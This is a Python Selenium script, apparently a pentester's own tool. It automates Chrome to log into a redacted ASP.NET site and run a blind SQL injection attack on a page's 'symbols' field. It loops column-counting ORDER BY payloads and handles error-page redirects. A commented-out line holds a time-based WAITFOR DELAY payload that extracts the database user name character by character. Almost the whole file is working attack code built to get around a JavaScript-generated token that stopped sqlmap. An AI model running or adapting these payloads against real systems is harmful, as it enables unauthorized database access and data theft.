#!/usr/bin/env python3

# This is a quick and dirty python selenium script. It automates Chrome Browser 
# in this case I wrote it to perform a blind SQL injection attack.  Needs to be improved

# As crazy as this idea sounds, I was not able to get Sqlmap to work with a javascript generated 
# Token that was being added to the URL, due to the way the web app was designed I decided to write this

# You will need to install chrome - sudo apt-cache search chrome 
# And download Chrome drive from https://chromedriver.chromium.org/downloads


import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException


def autoPwn():
	chrome_options = webdriver.ChromeOptions()
	chrome_options.add_argument("--window-size=800x600")
	chrome_options.add_argument('--no-sandbox')
	# Option if you want the script to be headless 
	#chrome_options.add_argument('--headless') 
	chrome_options.add_argument('--ignore-certificate-errors')
	# Path to chrome driver 
	driver = webdriver.Chrome(options=chrome_options, executable_path="/home/kali/chromedriver")
	url = "http://www.redacted.com/login.aspx"
	driver.get(url)
	driver.find_element_by_name('uid').send_keys('test1')
	driver.find_element_by_name('password').send_keys('test1')
	elem = driver.find_element_by_xpath('//*[@id="LinkLogin"]')
	elem.click()

	# Vulnerable URL where Blind SQL injection
	URL = 'http://www.redacted.com/something.aspx'
	driver.get(URL)

	while True:

		# We grab the current URL 
		check_current_url = driver.current_url

		try:
			driver.find_element_by_xpath('//*[@id="errorMsg"]/b ')

		except NoSuchElementException:
				driver.get(URL)
				pass


		# We check  the current URL we are on - due to the Web app's behavior 
		# If the Blind SQL injection is TRUE it will timeout and  redirect to an ERROR.aspx page
		if check_current_url == 'http://www.redacted.com/Error.htm?errorpath=/vuln.aspx':
			print('Hit redirect to Error.htm')
			# We give the browser the URL to go back to - the vuln URL
			URL = 'http://www.redacted.com/something.aspx'
			driver.get(URL)
			print('Redirecting back to Vuln Page')
			print(driver.current_url)
			time.sleep(10)


		else:
			# IF we did not hit the redirect We look for the vuln injection point and inject our blind SQL
			# I am using find element by xpath you can get this by copying it off your browser
			# This part needs improvment.
			for i in range(1,10): # We iterate over here
				driver.find_element_by_name('symbols').clear()
				
				payload = "1' ORDER BY {}--".format(i) # 1' ORDER BY 1-10-- 
				#payload = "1' if (ascii(lower(substring((user),1,1)))={}) waitfor delay '00:00:30'-- ".format(i)

				driver.find_element_by_name('symbols').send_keys(payload)
				elem = driver.find_element_by_xpath('//*[@id="LinkButtonQuote"]')
				elem.click()
				print(payload)
				print(i)
				time.sleep(0.5)

autoPwn()
